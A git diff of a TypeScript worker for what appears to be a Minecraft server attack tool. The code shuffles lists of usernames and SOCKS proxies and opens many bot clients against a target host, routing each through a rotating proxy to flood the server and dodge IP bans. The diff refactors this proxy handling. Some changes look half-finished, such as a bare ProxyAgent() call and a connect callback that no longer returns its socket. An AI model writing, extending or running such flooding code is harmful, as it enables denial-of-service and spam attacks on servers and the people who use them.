@@ -1,11 +1,12 @@
-import { parentPort, workerData as anyWorkerData } from 'worker_threads'
+import { workerData as anyWorkerData } from 'worker_threads'
 import { AttackOptions } from '../../utils/types'
 import 'colors'
 import { getRandomArbitrary, sleep } from 'emberutils'
 import { Client, createClient } from 'minecraft-protocol'
-import { SocksClient } from 'socks'
-import {kickHandler, log, shuffle} from '../shared'
+import { SocksClient as socks } from 'socks'
+import {awaitReady, kickHandler, log, shuffle} from '../shared'
 import prismarineChat from 'prismarine-chat'
+import ProxyAgent from 'proxy-agent';
 
 const chatInstance = prismarineChat('1.12')
 const { fromNotch } = chatInstance
@@ -15,23 +16,14 @@ const spaceRegex = /\s{2,}/gm
 
 const workerOptions: AttackOptions = anyWorkerData
 
-async function awaitReady () {
-  return await new Promise<void>(resolve => {
-    parentPort!.once('message', async message => {
-      if (message.ready) resolve()
-      else await awaitReady()
-    })
-  })
-}
-
 async function main () {
   await awaitReady()
 
   const usernames = workerOptions.usernames
 
   shuffle(usernames)
-  if (workerOptions.proxy)
-    shuffle(workerOptions.proxy)
+  if (workerOptions.proxies)
+    shuffle(workerOptions.proxies)
 
   let i = 0
   for (const username of usernames) {
@@ -42,15 +34,17 @@ async function main () {
         await sleep(timeout)
       }
 
+      const proxy = workerOptions.proxies ? workerOptions.proxies![i] : null
+
+      ProxyAgent()
       return createClient({
         username: username,
         host: workerOptions.host,
         port: workerOptions.port,
         version: '1.12.2',
-        connect: (workerOptions.proxy != undefined)
-          ? async (client) => {
-            const proxy = workerOptions.proxy![i]
-            return await SocksClient.createConnection({
+        /*agent: proxy ? new ProxyAgent({ protocol: 'socks5:', host: proxy.host, port: proxy.port }) : undefined,*/
+        connect: proxy ? (client) => {
+          socks.createConnection({
               proxy: {
                 host: proxy.host,
                 port: proxy.port,
@@ -71,8 +65,7 @@ async function main () {
                 log(`[${username}] Proxy socket closed`.red)
               } else console.log(err)
             })
-          }
-          : undefined
+          } : undefined
       })
     }
 
